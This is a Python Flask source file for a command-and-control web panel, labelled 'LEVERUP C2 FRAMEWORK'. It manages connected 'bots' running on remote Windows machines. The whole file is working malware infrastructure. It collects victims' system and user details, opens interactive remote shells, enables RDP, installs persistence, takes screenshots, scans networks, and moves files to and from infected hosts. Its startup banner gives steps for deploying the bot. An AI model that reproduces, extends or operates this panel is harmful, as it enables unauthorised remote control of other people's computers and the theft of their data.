# app.py - C2 Web Control Panel Server WITH FILE TRANSFER (Fully Type-Safe)
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import threading
import queue
import time
import json
import select
from datetime import datetime
import logging
import base64
import os
from typing import Optional, BinaryIO

# Disable Flask logging
logging.getLogger('werkzeug').disabled = True

app = Flask(__name__, static_folder='static', template_folder='static')
app.config['SECRET_KEY'] = 'c2-server-secure-key-2024'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Global data structures
bots = {}
selected_bots = []
command_queue = queue.Queue()
event_logs = []
server_running = False
server_socket = None
c2_server_thread = None
command_handler_thread = None
current_shell_bot = None
current_server_ip = '0.0.0.0'
current_server_port = 8080

# Ensure required directories exist
os.makedirs('uploads', exist_ok=True)
os.makedirs('files', exist_ok=True)

class BotConnection:
    def __init__(self, socket, address):
        self.socket = socket
        self.address = address
        self.ip = address[0]
        self.port = address[1]
        self.bot_id = f"{address[0]}:{address[1]}_{int(time.time())}"
        self.info = {
            'hostname': 'Unknown',
            'username': 'Unknown',
            'os': 'Unknown',
            'arch': 'Unknown',
            'admin': 'No',
            'rdp': 'Disabled',
            'connected': datetime.now().strftime('%H:%M:%S'),
            'ip': address[0],
            'port': address[1]
        }
        self.status = "connected"
        self.last_seen = datetime.now()
        self.shell_mode = False
        
        # File transfer attributes
        self.expecting_upload = False
        self.upload_filename: Optional[str] = None
        self.upload_file: Optional[BinaryIO] = None
        self.upload_buffer = b''
        self.upload_filepath: Optional[str] = None
        
    def to_dict(self):
        return {
            'id': self.bot_id,
            'ip': self.ip,
            'port': self.port,
            'info': self.info,
            'status': self.status,
            'last_seen': self.last_seen.strftime('%H:%M:%S'),
            'selected': self.bot_id in selected_bots,
            'shell_mode': self.shell_mode
        }
    
    def send_command(self, command):
        try:
            self.socket.sendall((command + "\n").encode())
            return True
        except:
            return False

def log_event(title, message, level="info"):
    """Add event to log"""
    event = {
        'id': len(event_logs) + 1,
        'time': datetime.now().strftime('%H:%M:%S'),
        'title': title,
        'message': message,
        'level': level
    }
    event_logs.append(event)
    
    if len(event_logs) > 100:
        event_logs.pop(0)
    
    socketio.emit('new_event', event)
    return event

def parse_bot_info(data):
    """Parse system information from bot"""
    info = {
        'hostname': 'Unknown',
        'username': 'Unknown',
        'os': 'Unknown',
        'arch': 'Unknown',
        'admin': 'No',
        'rdp': 'Disabled'
    }
    
    try:
        lines = data.strip().split('\n')
        for line in lines:
            line = line.strip()
            if line.startswith('[SYSTEM_INFO]'):
                continue
            elif line.startswith('[END]'):
                break
            elif line.startswith('Computer:'):
                info['hostname'] = line[10:].strip()
            elif line.startswith('User:'):
                info['username'] = line[5:].strip()
            elif line.startswith('Admin:'):
                info['admin'] = line[6:].strip()
            elif 'Windows' in line and 'os' not in info:
                info['os'] = line.strip()
    except:
        pass
    
    return info

def handle_bot_connection(client_socket, address):
    """Handle individual bot connection"""
    global current_shell_bot
    
    bot = BotConnection(client_socket, address)
    bot_id = bot.bot_id
    
    try:
        client_socket.settimeout(10.0)
        
        system_info = b""
        start_time = time.time()
        while time.time() - start_time < 10:
            try:
                data = client_socket.recv(4096)
                if data:
                    system_info += data
                    if b'[END]' in data:
                        break
            except socket.timeout:
                continue
            except:
                break
        
        if not system_info:
            client_socket.close()
            return
        
        decoded_info = system_info.decode('utf-8', errors='ignore')
        bot.info.update(parse_bot_info(decoded_info))
        
        bots[bot_id] = bot
        socketio.emit('bot_connected', bot.to_dict())
        log_event("Bot Connected", 
                 f"{bot.info['hostname']} ({bot.ip}:{bot.port}) - User: {bot.info['username']}", 
                 "success")
        
        client_socket.settimeout(0.5)
        
        while server_running and bot_id in bots:
            try:
                ready_to_read, _, _ = select.select([client_socket], [], [], 0.5)
                if ready_to_read:
                    data = client_socket.recv(16384)
                    if data:
                        bot.last_seen = datetime.now()
                        
                        # ----- FILE UPLOAD HANDLING (store) -----
                        if bot.expecting_upload:
                            bot.upload_buffer += data
                            marker = b'FILE_END'
                            pos = bot.upload_buffer.find(marker)
                            
                            if pos != -1:
                                # Marker found – write everything before it
                                if pos > 0:
                                    if bot.upload_file is None:
                                        upload_dir = os.path.join('uploads', bot.bot_id.replace(':', '_'))
                                        os.makedirs(upload_dir, exist_ok=True)
                                        # Ensure upload_filename is set (should be, because expecting_upload is True)
                                        assert bot.upload_filename is not None, "upload_filename must be set when expecting_upload"
                                        filepath = os.path.join(upload_dir, bot.upload_filename)
                                        bot.upload_file = open(filepath, 'wb')
                                        bot.upload_filepath = filepath
                                    bot.upload_file.write(bot.upload_buffer[:pos])
                                
                                # Close file and reset state
                                if bot.upload_file is not None:
                                    bot.upload_file.close()
                                    bot.upload_file = None
                                
                                # Notify frontend
                                assert bot.upload_filepath is not None, "upload_filepath should be set after file creation"
                                socketio.emit('file_uploaded', {
                                    'bot_id': bot_id,
                                    'filename': bot.upload_filename,
                                    'path': bot.upload_filepath
                                })
                                log_event("File Uploaded", f"File '{bot.upload_filename}' saved from {bot.ip}", "success")
                                
                                # Any remaining data after marker is normal output
                                remaining = bot.upload_buffer[pos+len(marker):]
                                bot.upload_buffer = b''
                                bot.expecting_upload = False
                                
                                if remaining:
                                    # Process remaining data as normal output
                                    output = remaining.decode('utf-8', errors='ignore')
                                    # Check special patterns
                                    if "RDP ENABLED" in output or "RDP IS FULLY ENABLED" in output:
                                        log_event("RDP Enabled", f"Remote Desktop enabled on {bot.ip}", "rdp")
                                        socketio.emit('rdp_ready', {'bot_id': bot_id, 'ip': bot.ip})
                                    if "SHELL>" in output or "C:\\" in output or "cmd.exe" in output.lower() or "PS C:" in output:
                                        bot.shell_mode = True
                                        if current_shell_bot != bot_id:
                                            current_shell_bot = bot_id
                                            socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': True})
                                    elif "Exiting shell" in output or "Goodbye" in output or "shell session ended" in output.lower():
                                        bot.shell_mode = False
                                        if current_shell_bot == bot_id:
                                            current_shell_bot = None
                                            socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': False})
                                    # Emit output
                                    socketio.emit('bot_output', {
                                        'bot_id': bot_id,
                                        'output': output,
                                        'shell_mode': bot.shell_mode
                                    })
                                continue  # Skip normal output handling for this chunk
                            else:
                                # No marker yet – just accumulate
                                continue
                        
                        # ----- NORMAL OUTPUT HANDLING -----
                        output = data.decode('utf-8', errors='ignore')
                        
                        if "RDP ENABLED" in output or "RDP IS FULLY ENABLED" in output:
                            log_event("RDP Enabled", f"Remote Desktop enabled on {bot.ip}", "rdp")
                            socketio.emit('rdp_ready', {'bot_id': bot_id, 'ip': bot.ip})
                        
                        if "SHELL>" in output or "C:\\" in output or "cmd.exe" in output.lower() or "PS C:" in output:
                            bot.shell_mode = True
                            if current_shell_bot != bot_id:
                                current_shell_bot = bot_id
                                socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': True})
                        elif "Exiting shell" in output or "Goodbye" in output or "shell session ended" in output.lower():
                            bot.shell_mode = False
                            if current_shell_bot == bot_id:
                                current_shell_bot = None
                                socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': False})
                        
                        socketio.emit('bot_output', {
                            'bot_id': bot_id,
                            'output': output,
                            'shell_mode': bot.shell_mode
                        })
                        
            except socket.timeout:
                continue
            except Exception as e:
                log_event("Bot Socket Error", f"Error with {bot.ip}: {str(e)}", "error")
                break
                
    except Exception as e:
        log_event("Bot Error", f"Error with {bot.ip}: {str(e)}", "error")
    
    # Cleanup
    if bot_id in bots:
        del bots[bot_id]
    if bot_id in selected_bots:
        selected_bots.remove(bot_id)
    if current_shell_bot == bot_id:
        current_shell_bot = None
        socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': False})
    
    try:
        client_socket.close()
    except:
        pass
    
    socketio.emit('bot_disconnected', {'bot_id': bot_id})
    log_event("Bot Disconnected", f"{bot.ip}:{bot.port} disconnected", "warning")

def start_c2_server_socket(host, port):
    """Start C2 server using socket directly"""
    global server_socket, server_running, c2_server_thread
    
    def server_loop():
        global server_socket, server_running
        
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((host, port))
            server_socket.listen(10)
            server_socket.settimeout(1.0)
            
            log_event("C2 Server Started", f"Listening for bots on {host}:{port}", "success")
            socketio.emit('server_update', {
                'status': 'running',
                'host': host,
                'port': port,
                'bots': len(bots),
                'type': 'c2_listener'
            })
            
            while server_running:
                try:
                    client_socket, address = server_socket.accept()
                    log_event("New Connection", f"Bot connected from {address[0]}:{address[1]}", "info")
                    
                    bot_thread = threading.Thread(
                        target=handle_bot_connection,
                        args=(client_socket, address),
                        daemon=True
                    )
                    bot_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if server_running:
                        log_event("Accept Error", str(e), "error")
                    continue
                    
            server_socket.close()
            
        except Exception as e:
            log_event("Server Error", str(e), "error")
            socketio.emit('server_update', {'status': 'error', 'error': str(e), 'type': 'c2_listener'})
            server_running = False
    
    c2_server_thread = threading.Thread(target=server_loop, daemon=True)
    c2_server_thread.start()
    return True

def command_handler():
    """Handle commands from the web interface"""
    global current_shell_bot
    
    while True:
        try:
            if not command_queue.empty():
                target, command_type, params = command_queue.get(timeout=0.1)
                
                if target == 'all':
                    bot_list = list(bots.keys())
                elif target == 'selected':
                    bot_list = [b for b in selected_bots if b in bots]
                elif target == 'shell':
                    if current_shell_bot and current_shell_bot in bots:
                        bot_list = [current_shell_bot]
                    else:
                        bot_list = []
                else:
                    bot_list = [target] if target in bots else []
                
                for bot_id in bot_list:
                    bot = bots.get(bot_id)
                    if not bot:
                        continue
                    
                    # Prepare command based on type
                    if command_type == 'sysinfo':
                        cmd = "sysinfo"
                    elif command_type == 'shell':
                        cmd = "shell"
                        bot.shell_mode = True
                        current_shell_bot = bot_id
                        socketio.emit('shell_mode_changed', {'bot_id': bot_id, 'active': True})
                    elif command_type == 'enablerdp':
                        cmd = "enablerdp"
                    elif command_type == 'screenshot':
                        cmd = "screenshot"
                    elif command_type == 'persist':
                        cmd = "persist"
                    elif command_type == 'shell_command':
                        cmd = params.get('cmd', '')
                        if not cmd:
                            continue
                    elif command_type == 'custom':
                        cmd = params.get('cmd', '')
                    elif command_type == 'networkscan':
                        cmd = "networkscan"
                    elif command_type == 'store':
                        # File upload from bot
                        filename = params.get('filename')
                        if not filename:
                            continue
                        # Set upload mode BEFORE sending command
                        bot.expecting_upload = True
                        bot.upload_filename = filename
                        bot.upload_buffer = b''
                        bot.upload_file = None
                        cmd = f"store {filename}"
                    elif command_type == 'retrieve':
                        filename = params.get('filename')
                        dest = params.get('dest', filename)
                        if not filename:
                            continue

                        print(f"[SERVER] Starting retrieve: {filename} -> {dest}")  # Console log

                        cmd = f"retrieve {dest}"
                        if bot.send_command(cmd):
                            file_path = os.path.join('files', filename)
                            print(f"[SERVER] Looking for file: {file_path}")
                            if os.path.exists(file_path):
                                file_size = os.path.getsize(file_path)
                                print(f"[SERVER] File found, size: {file_size} bytes")
                                try:
                                    with open(file_path, 'rb') as f:
                                        chunk_count = 0
                                        while True:
                                            chunk = f.read(4096)
                                            if not chunk:
                                                break
                                            bot.socket.sendall(chunk)
                                            chunk_count += 1
                                            print(f"[SERVER] Sent chunk {chunk_count} ({len(chunk)} bytes)")
                                    bot.socket.sendall(b"FILE_END")
                                    print(f"[SERVER] FILE_END sent")
                                    log_event("File Sent", f"Sent {filename} to {bot.info['hostname']}", "info")
                                    # Send a success message to the bot (optional, but helpful)
                                except Exception as e:
                                    error_msg = f"[-] Error sending file: {str(e)}\n"
                                    print(f"[SERVER ERROR] {error_msg}")
                                    try:
                                        bot.socket.sendall(error_msg.encode())
                                    except:
                                        pass
                                    log_event("File Send Error", f"Error sending {filename}: {str(e)}", "error")
                            else:
                                error_msg = f"[-] File {filename} not found on server\n"
                                print(f"[SERVER] {error_msg}")
                                try:
                                    bot.socket.sendall(error_msg.encode())
                                except:
                                    pass
                                log_event("File Not Found", f"{filename} not found in files/", "error")
                        else:
                            print(f"[SERVER] Failed to send retrieve command to bot")
                        continue
                    else:
                        cmd = command_type
                    
                    if cmd:
                        bot.send_command(cmd)
                        log_event("Command Sent", f"{cmd} to {bot.info['hostname']}", "info")
            
            time.sleep(0.1)
        except queue.Empty:
            time.sleep(0.1)
        except Exception as e:
            log_event("Command Handler Error", str(e), "error")
            time.sleep(1)

def is_port_in_use(port):
    """Check if a port is already in use"""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', port))
            return False
        except:
            return True

# Flask Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/status')
def get_status():
    return jsonify({
        'server_running': server_running,
        'total_bots': len(bots),
        'selected_bots': len(selected_bots),
        'events_total': len(event_logs),
        'current_shell_bot': current_shell_bot,
        'current_ip': current_server_ip,
        'current_port': current_server_port
    })

@app.route('/api/bots')
def get_bots():
    bot_list = [bot.to_dict() for bot in bots.values()]
    return jsonify(bot_list)

@app.route('/api/events')
def get_events():
    return jsonify(event_logs[-50:])

@app.route('/api/start', methods=['POST'])
def start_server():
    global server_running, current_shell_bot, current_server_ip, current_server_port
    
    if server_running:
        return jsonify({'success': False, 'error': 'C2 Server already running'})
    
    data = request.json
    host = data.get('host', '0.0.0.0')
    port = data.get('port', 8080)
    
    try:
        port = int(port)
        if not (1 <= port <= 65535):
            return jsonify({'success': False, 'error': 'Invalid port number (1-65535)'})
    except:
        return jsonify({'success': False, 'error': 'Invalid port number'})
    
    if is_port_in_use(port):
        return jsonify({'success': False, 'error': f'Port {port} is already in use'})
    
    bots.clear()
    selected_bots.clear()
    current_shell_bot = None
    
    server_running = True
    
    if not start_c2_server_socket(host, port):
        server_running = False
        return jsonify({'success': False, 'error': 'Failed to start C2 server'})
    
    global command_handler_thread
    if command_handler_thread is None or not command_handler_thread.is_alive():
        command_handler_thread = threading.Thread(
            target=command_handler,
            daemon=True
        )
        command_handler_thread.start()
    
    current_server_ip = host
    current_server_port = port
    
    return jsonify({
        'success': True, 
        'message': f'C2 Server started on {host}:{port}',
        'host': host,
        'port': port
    })

@app.route('/api/stop', methods=['POST'])
def stop_server():
    global server_running, current_shell_bot, server_socket, c2_server_thread
    
    if not server_running:
        return jsonify({'success': False, 'error': 'C2 Server not running'})
    
    server_running = False
    
    if server_socket:
        try:
            server_socket.close()
        except:
            pass
    
    for bot_id, bot in list(bots.items()):
        try:
            bot.send_command("exit")
        except:
            pass
        try:
            bot.socket.close()
        except:
            pass
    
    bots.clear()
    selected_bots.clear()
    current_shell_bot = None
    
    if c2_server_thread and c2_server_thread.is_alive():
        c2_server_thread.join(timeout=2.0)  # Use float to satisfy type checker
    
    log_event("C2 Server Stopped", "All connections closed", "warning")
    socketio.emit('server_update', {'status': 'stopped', 'type': 'c2_listener'})
    
    return jsonify({'success': True})

@app.route('/api/command', methods=['POST'])
def send_command():
    if not server_running:
        return jsonify({'success': False, 'error': 'C2 Server not running'})
    
    data = request.json
    target = data.get('target', 'selected')
    command_type = data.get('type', 'custom')
    params = data.get('params', {})
    
    if command_type == 'shell_command':
        if not current_shell_bot:
            return jsonify({'success': False, 'error': 'No bot in shell mode. Use "Start Shell" first.'})
        target = current_shell_bot
    
    command_queue.put((target, command_type, params))
    return jsonify({'success': True})

@app.route('/api/select', methods=['POST'])
def select_bots():
    data = request.json
    action = data.get('action')
    bot_ids = data.get('bots', [])
    
    if action == 'select':
        for bot_id in bot_ids:
            if bot_id in bots and bot_id not in selected_bots:
                selected_bots.append(bot_id)
    elif action == 'deselect':
        for bot_id in bot_ids:
            if bot_id in selected_bots:
                selected_bots.remove(bot_id)
    elif action == 'select_all':
        selected_bots.clear()
        selected_bots.extend(list(bots.keys()))
    elif action == 'clear':
        selected_bots.clear()
    
    return jsonify({'success': True, 'selected': selected_bots})

# WebSocket Events
@socketio.on('connect')
def handle_connect():
    emit('connected', {'message': 'Connected to C2 Control Panel'})
    emit('server_update', {
        'status': 'running' if server_running else 'stopped',
        'bots': len(bots),
        'type': 'web_interface'
    })

@socketio.on('disconnect')
def handle_disconnect():
    pass

if __name__ == '__main__':
    print("\n" + "="*80)
    print("                LEVERUP C2 FRAMEWORK WITH FILE TRANSFER")
    print("="*80)
    print("\n[+] Web Interface: http://127.0.0.1:5000")
    print("[+] C2 Server Port: 8080 (for bot connections)")
    print("\n[+] File Transfer Commands Added:")
    print("    • store <path>    - Upload file from bot to server")
    print("    • retrieve <path> - Download file from server to bot")
    print("\n[+] Files are stored in:")
    print("    • uploads/         - Files uploaded from bots")
    print("    • files/           - Files ready to send to bots")
    print("\n[+] Instructions:")
    print("    1. Start the C2 Server from the web interface")
    print("    2. Enter IP and port when prompted")
    print("    3. Compile and run the bot with your server IP")
    print("    4. Bot will connect to your specified port")
    print("    5. Use the web interface to control bots")
    print("\n[+] Example bot command:")
    print("    bot.exe YOUR_SERVER_IP YOUR_PORT")
    print("="*80 + "\n")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)